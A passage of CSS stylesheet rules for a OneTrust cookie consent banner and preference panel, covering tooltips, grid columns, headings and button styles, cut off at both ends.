            margin-left: -5px;
            border-width: 5px;
            border-style: solid;
            border-color: #555 transparent transparent transparent
        }

        #onetrust-pc-sdk .ot-tooltip:hover .ot-tooltiptext {
            visibility: visible;
            opacity: 1
        }

        #onetrust-pc-sdk .ot-tooltip {
            position: relative;
            display: inline-block;
            z-index: 3
        }

        #onetrust-pc-sdk .ot-tooltip svg {
            color: grey;
            height: 20px;
            width: 20px
        }

        #onetrust-pc-sdk .screen-reader-only,
        #onetrust-pc-sdk .ot-scrn-rdr,
        .ot-sdk-cookie-policy .screen-reader-only,
        .ot-sdk-cookie-policy .ot-scrn-rdr {
            border: 0;
            clip: rect(0 0 0 0);
            height: 1px;
            margin: -1px;
            overflow: hidden;
            padding: 0;
            position: absolute;
            width: 1px
        }

        #onetrust-pc-sdk.ot-fade-in,
        .onetrust-pc-dark-filter.ot-fade-in,
        #onetrust-banner-sdk.ot-fade-in {
            animation-name: onetrust-fade-in;
            animation-duration: 400ms;
            animation-timing-function: ease-in-out
        }

        #onetrust-pc-sdk.ot-hide {
            display: none !important
        }

        .onetrust-pc-dark-filter.ot-hide {
            display: none !important
        }

        #ot-sdk-btn.ot-sdk-show-settings,
        #ot-sdk-btn.optanon-show-settings {
            color: #68b631;
            border: 1px solid #68b631;
            height: auto;
            white-space: normal;
            word-wrap: break-word;
            padding: 0.8em 2em;
            font-size: 0.8em;
            line-height: 1.2;
            cursor: pointer;
            -moz-transition: 0.1s ease;
            -o-transition: 0.1s ease;
            -webkit-transition: 1s ease;
            transition: 0.1s ease
        }

        #ot-sdk-btn.ot-sdk-show-settings:hover,
        #ot-sdk-btn.optanon-show-settings:hover {
            color: #fff;
            background-color: #68b631
        }

        .onetrust-pc-dark-filter {
            background: rgba(0, 0, 0, 0.5);
            z-index: 2147483646;
            width: 100%;
            height: 100%;
            overflow: hidden;
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0
        }

        @keyframes onetrust-fade-in {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @media only screen and (min-width: 426px) and (max-width: 896px) and (orientation: landscape) {
            #onetrust-pc-sdk p {
                font-size: 0.75em
            }
        }

        #onetrust-banner-sdk .banner-option-input:focus+label {
            outline: 1px solid #000;
            outline-style: auto
        }

        #onetrust-banner-sdk,
        #onetrust-pc-sdk,
        #ot-sdk-cookie-policy,
        #ot-sync-ntfy {
            font-size: 16px
        }

        #onetrust-banner-sdk *,
        #onetrust-banner-sdk ::after,
        #onetrust-banner-sdk ::before,
        #onetrust-pc-sdk *,
        #onetrust-pc-sdk ::after,
        #onetrust-pc-sdk ::before,
        #ot-sdk-cookie-policy *,
        #ot-sdk-cookie-policy ::after,
        #ot-sdk-cookie-policy ::before,
        #ot-sync-ntfy *,
        #ot-sync-ntfy ::after,
        #ot-sync-ntfy ::before {
            -webkit-box-sizing: content-box;
            -moz-box-sizing: content-box;
            box-sizing: content-box
        }

        #onetrust-banner-sdk div,
        #onetrust-banner-sdk span,
        #onetrust-banner-sdk h1,
        #onetrust-banner-sdk h2,
        #onetrust-banner-sdk h3,
        #onetrust-banner-sdk h4,
        #onetrust-banner-sdk h5,
        #onetrust-banner-sdk h6,
        #onetrust-banner-sdk p,
        #onetrust-banner-sdk img,
        #onetrust-banner-sdk svg,
        #onetrust-banner-sdk button,
        #onetrust-banner-sdk section,
        #onetrust-banner-sdk a,
        #onetrust-banner-sdk label,
        #onetrust-banner-sdk input,
        #onetrust-banner-sdk ul,
        #onetrust-banner-sdk li,
        #onetrust-banner-sdk nav,
        #onetrust-banner-sdk table,
        #onetrust-banner-sdk thead,
        #onetrust-banner-sdk tr,
        #onetrust-banner-sdk td,
        #onetrust-banner-sdk tbody,
        #onetrust-banner-sdk .ot-main-content,
        #onetrust-banner-sdk .ot-toggle,
        #onetrust-banner-sdk #ot-content,
        #onetrust-banner-sdk #ot-pc-content,
        #onetrust-banner-sdk .checkbox,
        #onetrust-pc-sdk div,
        #onetrust-pc-sdk span,
        #onetrust-pc-sdk h1,
        #onetrust-pc-sdk h2,
        #onetrust-pc-sdk h3,
        #onetrust-pc-sdk h4,
        #onetrust-pc-sdk h5,
        #onetrust-pc-sdk h6,
        #onetrust-pc-sdk p,
        #onetrust-pc-sdk img,
        #onetrust-pc-sdk svg,
        #onetrust-pc-sdk button,
        #onetrust-pc-sdk section,
        #onetrust-pc-sdk a,
        #onetrust-pc-sdk label,
        #onetrust-pc-sdk input,
        #onetrust-pc-sdk ul,
        #onetrust-pc-sdk li,
        #onetrust-pc-sdk nav,
        #onetrust-pc-sdk table,
        #onetrust-pc-sdk thead,
        #onetrust-pc-sdk tr,
        #onetrust-pc-sdk td,
        #onetrust-pc-sdk tbody,
        #onetrust-pc-sdk .ot-main-content,
        #onetrust-pc-sdk .ot-toggle,
        #onetrust-pc-sdk #ot-content,
        #onetrust-pc-sdk #ot-pc-content,
        #onetrust-pc-sdk .checkbox,
        #ot-sdk-cookie-policy div,
        #ot-sdk-cookie-policy span,
        #ot-sdk-cookie-policy h1,
        #ot-sdk-cookie-policy h2,
        #ot-sdk-cookie-policy h3,
        #ot-sdk-cookie-policy h4,
        #ot-sdk-cookie-policy h5,
        #ot-sdk-cookie-policy h6,
        #ot-sdk-cookie-policy p,
        #ot-sdk-cookie-policy img,
        #ot-sdk-cookie-policy svg,
        #ot-sdk-cookie-policy button,
        #ot-sdk-cookie-policy section,
        #ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy label,
        #ot-sdk-cookie-policy input,
        #ot-sdk-cookie-policy ul,
        #ot-sdk-cookie-policy li,
        #ot-sdk-cookie-policy nav,
        #ot-sdk-cookie-policy table,
        #ot-sdk-cookie-policy thead,
        #ot-sdk-cookie-policy tr,
        #ot-sdk-cookie-policy td,
        #ot-sdk-cookie-policy tbody,
        #ot-sdk-cookie-policy .ot-main-content,
        #ot-sdk-cookie-policy .ot-toggle,
        #ot-sdk-cookie-policy #ot-content,
        #ot-sdk-cookie-policy #ot-pc-content,
        #ot-sdk-cookie-policy .checkbox,
        #ot-sync-ntfy div,
        #ot-sync-ntfy span,
        #ot-sync-ntfy h1,
        #ot-sync-ntfy h2,
        #ot-sync-ntfy h3,
        #ot-sync-ntfy h4,
        #ot-sync-ntfy h5,
        #ot-sync-ntfy h6,
        #ot-sync-ntfy p,
        #ot-sync-ntfy img,
        #ot-sync-ntfy svg,
        #ot-sync-ntfy button,
        #ot-sync-ntfy section,
        #ot-sync-ntfy a,
        #ot-sync-ntfy label,
        #ot-sync-ntfy input,
        #ot-sync-ntfy ul,
        #ot-sync-ntfy li,
        #ot-sync-ntfy nav,
        #ot-sync-ntfy table,
        #ot-sync-ntfy thead,
        #ot-sync-ntfy tr,
        #ot-sync-ntfy td,
        #ot-sync-ntfy tbody,
        #ot-sync-ntfy .ot-main-content,
        #ot-sync-ntfy .ot-toggle,
        #ot-sync-ntfy #ot-content,
        #ot-sync-ntfy #ot-pc-content,
        #ot-sync-ntfy .checkbox {
            font-family: inherit;
            font-weight: normal;
            -webkit-font-smoothing: auto;
            letter-spacing: normal;
            line-height: normal;
            padding: 0;
            margin: 0;
            height: auto;
            min-height: 0;
            max-height: none;
            width: auto;
            min-width: 0;
            max-width: none;
            border-radius: 0;
            border: none;
            clear: none;
            float: none;
            position: static;
            bottom: auto;
            left: auto;
            right: auto;
            top: auto;
            text-align: left;
            text-decoration: none;
            text-indent: 0;
            text-shadow: none;
            text-transform: none;
            white-space: normal;
            background: none;
            overflow: visible;
            vertical-align: baseline;
            visibility: visible;
            z-index: auto;
            box-shadow: none
        }

        #onetrust-banner-sdk label:before,
        #onetrust-banner-sdk label:after,
        #onetrust-banner-sdk .checkbox:after,
        #onetrust-banner-sdk .checkbox:before,
        #onetrust-pc-sdk label:before,
        #onetrust-pc-sdk label:after,
        #onetrust-pc-sdk .checkbox:after,
        #onetrust-pc-sdk .checkbox:before,
        #ot-sdk-cookie-policy label:before,
        #ot-sdk-cookie-policy label:after,
        #ot-sdk-cookie-policy .checkbox:after,
        #ot-sdk-cookie-policy .checkbox:before,
        #ot-sync-ntfy label:before,
        #ot-sync-ntfy label:after,
        #ot-sync-ntfy .checkbox:after,
        #ot-sync-ntfy .checkbox:before {
            content: "";
            content: none
        }

        #onetrust-banner-sdk .ot-sdk-container,
        #onetrust-pc-sdk .ot-sdk-container,
        #ot-sdk-cookie-policy .ot-sdk-container {
            position: relative;
            width: 100%;
            max-width: 100%;
            margin: 0 auto;
            padding: 0 20px;
            box-sizing: border-box
        }

        #onetrust-banner-sdk .ot-sdk-column,
        #onetrust-banner-sdk .ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-column,
        #onetrust-pc-sdk .ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-column,
        #ot-sdk-cookie-policy .ot-sdk-columns {
            width: 100%;
            float: left;
            box-sizing: border-box;
            padding: 0;
            display: initial
        }

        @media (min-width: 400px) {

            #onetrust-banner-sdk .ot-sdk-container,
            #onetrust-pc-sdk .ot-sdk-container,
            #ot-sdk-cookie-policy .ot-sdk-container {
                width: 90%;
                padding: 0
            }
        }

        @media (min-width: 550px) {

            #onetrust-banner-sdk .ot-sdk-container,
            #onetrust-pc-sdk .ot-sdk-container,
            #ot-sdk-cookie-policy .ot-sdk-container {
                width: 100%
            }

            #onetrust-banner-sdk .ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-columns {
                margin-left: 4%
            }

            #onetrust-banner-sdk .ot-sdk-column:first-child,
            #onetrust-banner-sdk .ot-sdk-columns:first-child,
            #onetrust-pc-sdk .ot-sdk-column:first-child,
            #onetrust-pc-sdk .ot-sdk-columns:first-child,
            #ot-sdk-cookie-policy .ot-sdk-column:first-child,
            #ot-sdk-cookie-policy .ot-sdk-columns:first-child {
                margin-left: 0
            }

            #onetrust-banner-sdk .ot-sdk-one.ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-one.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-one.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-one.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-one.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-one.ot-sdk-columns {
                width: 4.66666666667%
            }

            #onetrust-banner-sdk .ot-sdk-two.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-two.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-two.ot-sdk-columns {
                width: 13.3333333333%
            }

            #onetrust-banner-sdk .ot-sdk-three.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-three.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-three.ot-sdk-columns {
                width: 22%
            }

            #onetrust-banner-sdk .ot-sdk-four.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-four.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-four.ot-sdk-columns {
                width: 30.6666666667%
            }

            #onetrust-banner-sdk .ot-sdk-five.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-five.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-five.ot-sdk-columns {
                width: 39.3333333333%
            }

            #onetrust-banner-sdk .ot-sdk-six.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-six.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-six.ot-sdk-columns {
                width: 48%
            }

            #onetrust-banner-sdk .ot-sdk-seven.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-seven.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-seven.ot-sdk-columns {
                width: 56.6666666667%
            }

            #onetrust-banner-sdk .ot-sdk-eight.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-eight.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-eight.ot-sdk-columns {
                width: 65.3333333333%
            }

            #onetrust-banner-sdk .ot-sdk-nine.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-nine.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-nine.ot-sdk-columns {
                width: 74%
            }

            #onetrust-banner-sdk .ot-sdk-ten.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-ten.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-ten.ot-sdk-columns {
                width: 82.6666666667%
            }

            #onetrust-banner-sdk .ot-sdk-eleven.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-eleven.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-eleven.ot-sdk-columns {
                width: 91.3333333333%
            }

            #onetrust-banner-sdk .ot-sdk-twelve.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-twelve.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-twelve.ot-sdk-columns {
                width: 100%;
                margin-left: 0
            }

            #onetrust-banner-sdk .ot-sdk-one-third.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-one-third.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-one-third.ot-sdk-column {
                width: 30.6666666667%
            }

            #onetrust-banner-sdk .ot-sdk-two-thirds.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-two-thirds.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-two-thirds.ot-sdk-column {
                width: 65.3333333333%
            }

            #onetrust-banner-sdk .ot-sdk-one-half.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-one-half.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-one-half.ot-sdk-column {
                width: 48%
            }

            #onetrust-banner-sdk .ot-sdk-offset-by-one.ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-offset-by-one.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-offset-by-one.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-offset-by-one.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-one.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-one.ot-sdk-columns {
                margin-left: 8.66666666667%
            }

            #onetrust-banner-sdk .ot-sdk-offset-by-two.ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-offset-by-two.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-offset-by-two.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-offset-by-two.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-two.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-two.ot-sdk-columns {
                margin-left: 17.3333333333%
            }

            #onetrust-banner-sdk .ot-sdk-offset-by-three.ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-offset-by-three.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-offset-by-three.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-offset-by-three.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-three.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-three.ot-sdk-columns {
                margin-left: 26%
            }

            #onetrust-banner-sdk .ot-sdk-offset-by-four.ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-offset-by-four.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-offset-by-four.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-offset-by-four.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-four.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-four.ot-sdk-columns {
                margin-left: 34.6666666667%
            }

            #onetrust-banner-sdk .ot-sdk-offset-by-five.ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-offset-by-five.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-offset-by-five.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-offset-by-five.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-five.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-five.ot-sdk-columns {
                margin-left: 43.3333333333%
            }

            #onetrust-banner-sdk .ot-sdk-offset-by-six.ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-offset-by-six.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-offset-by-six.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-offset-by-six.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-six.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-six.ot-sdk-columns {
                margin-left: 52%
            }

            #onetrust-banner-sdk .ot-sdk-offset-by-seven.ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-offset-by-seven.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-offset-by-seven.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-offset-by-seven.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-seven.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-seven.ot-sdk-columns {
                margin-left: 60.6666666667%
            }

            #onetrust-banner-sdk .ot-sdk-offset-by-eight.ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-offset-by-eight.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-offset-by-eight.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-offset-by-eight.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-eight.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-eight.ot-sdk-columns {
                margin-left: 69.3333333333%
            }

            #onetrust-banner-sdk .ot-sdk-offset-by-nine.ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-offset-by-nine.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-offset-by-nine.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-offset-by-nine.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-nine.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-nine.ot-sdk-columns {
                margin-left: 78%
            }

            #onetrust-banner-sdk .ot-sdk-offset-by-ten.ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-offset-by-ten.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-offset-by-ten.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-offset-by-ten.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-ten.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-ten.ot-sdk-columns {
                margin-left: 86.6666666667%
            }

            #onetrust-banner-sdk .ot-sdk-offset-by-eleven.ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-offset-by-eleven.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-offset-by-eleven.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-offset-by-eleven.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-eleven.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-eleven.ot-sdk-columns {
                margin-left: 95.3333333333%
            }

            #onetrust-banner-sdk .ot-sdk-offset-by-one-third.ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-offset-by-one-third.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-offset-by-one-third.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-offset-by-one-third.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-one-third.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-one-third.ot-sdk-columns {
                margin-left: 34.6666666667%
            }

            #onetrust-banner-sdk .ot-sdk-offset-by-two-thirds.ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-offset-by-two-thirds.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-offset-by-two-thirds.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-offset-by-two-thirds.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-two-thirds.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-two-thirds.ot-sdk-columns {
                margin-left: 69.3333333333%
            }

            #onetrust-banner-sdk .ot-sdk-offset-by-one-half.ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-offset-by-one-half.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-offset-by-one-half.ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-offset-by-one-half.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-one-half.ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-offset-by-one-half.ot-sdk-columns {
                margin-left: 52%
            }
        }

        #onetrust-banner-sdk h1,
        #onetrust-banner-sdk h2,
        #onetrust-banner-sdk h3,
        #onetrust-banner-sdk h4,
        #onetrust-banner-sdk h5,
        #onetrust-banner-sdk h6,
        #onetrust-pc-sdk h1,
        #onetrust-pc-sdk h2,
        #onetrust-pc-sdk h3,
        #onetrust-pc-sdk h4,
        #onetrust-pc-sdk h5,
        #onetrust-pc-sdk h6,
        #ot-sdk-cookie-policy h1,
        #ot-sdk-cookie-policy h2,
        #ot-sdk-cookie-policy h3,
        #ot-sdk-cookie-policy h4,
        #ot-sdk-cookie-policy h5,
        #ot-sdk-cookie-policy h6 {
            margin-top: 0;
            font-weight: 600;
            font-family: inherit
        }

        #onetrust-banner-sdk h1,
        #onetrust-pc-sdk h1,
        #ot-sdk-cookie-policy h1 {
            font-size: 1.5rem;
            line-height: 1.2
        }

        #onetrust-banner-sdk h2,
        #onetrust-pc-sdk h2,
        #ot-sdk-cookie-policy h2 {
            font-size: 1.5rem;
            line-height: 1.25
        }

        #onetrust-banner-sdk h3,
        #onetrust-pc-sdk h3,
        #ot-sdk-cookie-policy h3 {
            font-size: 1.5rem;
            line-height: 1.3
        }

        #onetrust-banner-sdk h4,
        #onetrust-pc-sdk h4,
        #ot-sdk-cookie-policy h4 {
            font-size: 1.5rem;
            line-height: 1.35
        }

        #onetrust-banner-sdk h5,
        #onetrust-pc-sdk h5,
        #ot-sdk-cookie-policy h5 {
            font-size: 1.5rem;
            line-height: 1.5
        }

        #onetrust-banner-sdk h6,
        #onetrust-pc-sdk h6,
        #ot-sdk-cookie-policy h6 {
            font-size: 1.5rem;
            line-height: 1.6
        }

        @media (min-width: 550px) {

            #onetrust-banner-sdk h1,
            #onetrust-pc-sdk h1,
            #ot-sdk-cookie-policy h1 {
                font-size: 1.5rem
            }

            #onetrust-banner-sdk h2,
            #onetrust-pc-sdk h2,
            #ot-sdk-cookie-policy h2 {
                font-size: 1.5rem
            }

            #onetrust-banner-sdk h3,
            #onetrust-pc-sdk h3,
            #ot-sdk-cookie-policy h3 {
                font-size: 1.5rem
            }

            #onetrust-banner-sdk h4,
            #onetrust-pc-sdk h4,
            #ot-sdk-cookie-policy h4 {
                font-size: 1.5rem
            }

            #onetrust-banner-sdk h5,
            #onetrust-pc-sdk h5,
            #ot-sdk-cookie-policy h5 {
                font-size: 1.5rem
            }

            #onetrust-banner-sdk h6,
            #onetrust-pc-sdk h6,
            #ot-sdk-cookie-policy h6 {
                font-size: 1.5rem
            }
        }

        #onetrust-banner-sdk p,
        #onetrust-pc-sdk p,
        #ot-sdk-cookie-policy p {
            margin: 0 0 1em 0;
            font-family: inherit;
            line-height: normal
        }

        #onetrust-banner-sdk a,
        #onetrust-pc-sdk a,
        #ot-sdk-cookie-policy a {
            color: #565656;
            text-decoration: underline
        }

        #onetrust-banner-sdk a:hover,
        #onetrust-pc-sdk a:hover,
        #ot-sdk-cookie-policy a:hover {
            color: #565656;
            text-decoration: none
        }

        #onetrust-banner-sdk .ot-sdk-button,
        #onetrust-banner-sdk button,
        #onetrust-pc-sdk .ot-sdk-button,
        #onetrust-pc-sdk button,
        #ot-sdk-cookie-policy .ot-sdk-button,
        #ot-sdk-cookie-policy button {
            margin-bottom: 1rem;
            font-family: inherit
        }

        #onetrust-banner-sdk .ot-sdk-button,
        #onetrust-banner-sdk button,
        #onetrust-banner-sdk input[type="submit"],
        #onetrust-banner-sdk input[type="reset"],
        #onetrust-banner-sdk input[type="button"],
        #onetrust-pc-sdk .ot-sdk-button,
        #onetrust-pc-sdk button,
        #onetrust-pc-sdk input[type="submit"],
        #onetrust-pc-sdk input[type="reset"],
        #onetrust-pc-sdk input[type="button"],
        #ot-sdk-cookie-policy .ot-sdk-button,
        #ot-sdk-cookie-policy button,
        #ot-sdk-cookie-policy input[type="submit"],
        #ot-sdk-cookie-policy input[type="reset"],
        #ot-sdk-cookie-policy input[type="button"] {
            display: inline-block;
            height: 38px;
            padding: 0 30px;
            color: #555;
            text-align: center;
            font-size: 0.9em;
            font-weight: 400;
            line-height: 38px;
            letter-spacing: 0.01em;
            text-decoration: none;
            white-space: nowrap;
            background-color: transparent;
            border-radius: 2px;
            border: 1px solid #bbb;
            cursor: pointer;
            box-sizing: border-box
        }

        #onetrust-banner-sdk .ot-sdk-button:hover,
        #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:hover,
        #onetrust-banner-sdk input[type="submit"]:hover,
        #onetrust-banner-sdk input[type="reset"]:hover,
        #onetrust-banner-sdk input[type="button"]:hover,
        #onetrust-banner-sdk .ot-sdk-button:focus,
        #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:focus,
        #onetrust-banner-sdk input[type="submit"]:focus,
        #onetrust-banner-sdk input[type="reset"]:focus,
        #onetrust-banner-sdk input[type="button"]:focus,
        #onetrust-pc-sdk .ot-sdk-button:hover,
        #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:hover,
        #onetrust-pc-sdk input[type="submit"]:hover,
        #onetrust-pc-sdk input[type="reset"]:hover,
        #onetrust-pc-sdk input[type="button"]:hover,
        #onetrust-pc-sdk .ot-sdk-button:focus,
        #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:focus,
        #onetrust-pc-sdk input[type="submit"]:focus,
        #onetrust-pc-sdk input[type="reset"]:focus,
        #onetrust-pc-sdk input[type="button"]:focus,
        #ot-sdk-cookie-policy .ot-sdk-button:hover,
        #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:hover,
        #ot-sdk-cookie-policy input[type="submit"]:hover,
        #ot-sdk-cookie-policy input[type="reset"]:hover,
        #ot-sdk-cookie-policy input[type="button"]:hover,
        #ot-sdk-cookie-policy .ot-sdk-button:focus,
        #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:focus,
        #ot-sdk-cookie-policy input[type="submit"]:focus,
        #ot-sdk-cookie-policy input[type="reset"]:focus,
        #ot-sdk-cookie-policy input[type="button"]:focus {
            color: #333;
            border-color: #888;
            opacity: 0.7
        }

        #onetrust-banner-sdk .ot-sdk-button:focus,
        #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:focus,
        #onetrust-banner-sdk input[type="submit"]:focus,
        #onetrust-banner-sdk input[type="reset"]:focus,
        #onetrust-banner-sdk input[type="button"]:focus,
        #onetrust-pc-sdk .ot-sdk-button:focus,
        #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:focus,
        #onetrust-pc-sdk input[type="submit"]:focus,
        #onetrust-pc-sdk input[type="reset"]:focus,
        #onetrust-pc-sdk input[type="button"]:focus,
        #ot-sdk-cookie-policy .ot-sdk-button:focus,
        #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:focus,
        #ot-sdk-cookie-policy input[type="submit"]:focus,
        #ot-sdk-cookie-policy input[type="reset"]:focus,
        #ot-sdk-cookie-policy input[type="button"]:focus {
            outline: 2px solid #000
        }

        #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary,
        #onetrust-banner-sdk button.ot-sdk-button-primary,
        #onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary,
        #onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary,
        #onetrust-banner-sdk input[type="button"].ot-sdk-button-primary,
        #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary,
        #onetrust-pc-sdk button.ot-sdk-button-primary,
        #onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary,
        #onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary,
        #onetrust-pc-sdk input[type="button"].ot-sdk-button-primary,
        #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary,
        #ot-sdk-cookie-policy button.ot-sdk-button-primary,
        #ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary,
        #ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary,
        #ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary {
            color: #fff;
            background-color: #33c3f0;
            border-color: #33c3f0
        }

        #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:hover,
        #onetrust-banner-sdk button.ot-sdk-button-primary:hover,
        #onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary:hover,
        #onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary:hover,
        #onetrust-banner-sdk input[type="button"].ot-sdk-button-primary:hover,
        #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:focus,
        #onetrust-banner-sdk button.ot-sdk-button-primary:focus,
        #onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary:focus,
        #onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary:focus,
        #onetrust-banner-sdk input[type="button"].ot-sdk-button-primary:focus,
        #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:hover,
        #onetrust-pc-sdk button.ot-sdk-button-primary:hover,
